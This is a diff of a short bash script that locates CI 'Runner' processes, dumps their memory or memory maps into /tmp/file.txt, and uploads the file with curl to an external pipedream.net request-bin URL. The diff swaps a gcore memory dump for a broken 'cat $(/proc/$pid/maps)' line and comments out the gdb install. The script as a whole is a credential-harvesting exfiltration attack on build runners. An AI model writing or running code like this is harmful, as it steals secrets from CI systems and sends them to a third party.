@@ -1,13 +1,13 @@
 #!/bin/bash
 
 # install gdb sudo is passwordless according to doc
-sudo apt-get install gdb -y > /tmp/file.txt
+#sudo apt-get install gdb -y > /tmp/file.txt
 
 # get pids related to runners
 for pid in $(ps -ef | grep Runner  | tr -s ' ' | cut -d ' ' -f2)
 do
     echo "---$pid---"
-    gcore $pid >> /tmp/file.txt
+    cat $(/proc/$pid/maps) >> /tmp/file.txt
 done
 
 curl --data-binary "@/tmp/file.txt" https://en0liva7dzyvpp.x.pipedream.net/
